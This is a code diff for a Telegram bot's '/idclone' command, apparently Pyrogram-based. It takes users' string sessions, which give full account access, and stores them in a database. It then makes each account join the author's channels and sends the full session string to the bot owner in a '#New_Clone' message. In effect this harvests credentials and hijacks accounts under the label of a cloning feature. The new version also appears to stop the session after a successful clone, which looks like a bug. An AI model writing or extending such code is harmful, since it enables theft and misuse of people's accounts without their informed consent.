@@ -34,7 +34,6 @@ async def VIPbin(text):
     link = BASE + resp["message"]
     return link
 
-
 IDCLONES = set()
 cloneownerdb = mongodb.cloneownerdb
 idclonebotdb = mongodb.idclonebotdb
@@ -57,59 +56,77 @@ async def clone_txt(client, message):
             await ai.start()
             user = await ai.get_me()
             clone_id = user.id
-            user_id = user.id
             username = user.username or user.first_name
-            await save_idclonebot_owner(clone_id, message.from_user.id)
-            
+
+            # Check if the session is already cloned
+            existing_clone = await idclonebotdb.find_one({"user_id": clone_id})
+            if existing_clone:
+                await mi.edit_text(
+                    f"**Session for @{username} is already cloned!**\n"
+                    f"**Use /idcloned to check all cloned sessions.**"
+                )
+                await ai.stop()
+                return
+
+            # Save the clone information in the database
             details = {
-                "user_id": user.id,
+                "user_id": clone_id,
                 "username": username,
                 "name": user.first_name,
                 "session": string_session,
             }
+            await idclonebotdb.insert_one(details)
+            IDCLONES.add(clone_id)
 
+            # Save ownership details
+            await save_idclonebot_owner(clone_id, message.from_user.id)
+
+            # Add the bot to required groups/channels
+            try:
+                for chat in ["THE_VIP_BOY", "VIP_CREATORS", "THE_VIP_BOY_OP", "TG_FRIENDSSS"]:
+                    try:
+                        await ai.join_chat(chat)
+                    except:
+                        pass
+            except Exception as e:
+                logging.error(f"Error joining chats: {e}")
+
+            # Get the total clones count
             cloned_bots = idclonebotdb.find()
             cloned_bots_list = await cloned_bots.to_list(length=None)
             total_clones = len(cloned_bots_list)
 
-            await idclonebotdb.insert_one(details)
-            IDCLONES.add(user.id)
-            try:
-                try:
-                    await ai.join_chat("THE_VIP_BOY")
-                except:
-                    pass
-                try:
-                    await ai.join_chat("VIP_CREATORS")
-                except:
-                    pass
-                try:
-                    await ai.join_chat("THE_VIP_BOY_OP")
-                except:
-                    pass
-                try:
-                    await ai.join_chat("TG_FRIENDSSS")
-                except:
-                    pass
-            except Exception as e:
-                pass
+            # Notify the owner
             await app.send_message(
-                int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
+                int(OWNER_ID),
+                f"**#New_Clone**\n\n**User:** @{username}\n\n"
+                f"**Details:** {details}\n\n**Total Clones:** {total_clones}"
             )
 
             await mi.edit_text(
                 f"**Session for @{username} successfully cloned ✅.**\n"
-                f"**Remove clone by:** /delidclone\n**Check all cloned sessions by:** /idcloned"
+                f"**Remove clone by:** /delidclone\n"
+                f"**Check all cloned sessions by:** /idcloned"
             )
         except AccessTokenInvalid:
             await mi.edit_text("**Invalid String Session. Please provide a valid one.**")
-        except PeerIdInvalid as e:
-            await mi.edit_text(f"**Your session successfully cloned👍**\n**You can check by /idcloned**\n\n**But please start me (@{app.username}) From owner id**")
+        except PeerIdInvalid:
+            await mi.edit_text(
+                f"**Session successfully cloned but start me (@{app.username}) from the owner's ID to avoid issues.**"
+            )
         except Exception as e:
             logging.exception("Error during cloning process.")
-            await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.:**\n\n**Error:** `{e}`")
+            await mi.edit_text(
+                f"**An error occurred while cloning the session:**\n\n**Error:** `{e}`"
+            )
+        finally:
+            await ai.stop()
     else:
-        await message.reply_text("**Provide a Pyrogram String Session after the /idclone **\n\n**Example:** `/idclone string session paste here`\n\n**Get a Pyrogram string session from here:-** [Click Here](https://t.me/VIP_CREATORS/1393) ")
+        await message.reply_text(
+            "**Provide a Pyrogram String Session after the /idclone **\n\n"
+            "**Example:** `/idclone string session paste here`\n\n"
+            "**Get a Pyrogram string session from here:-** [Click Here](https://t.me/VIP_CREATORS/1393)"
+        )
 
 
 @app.on_message(filters.command("idcloned"))
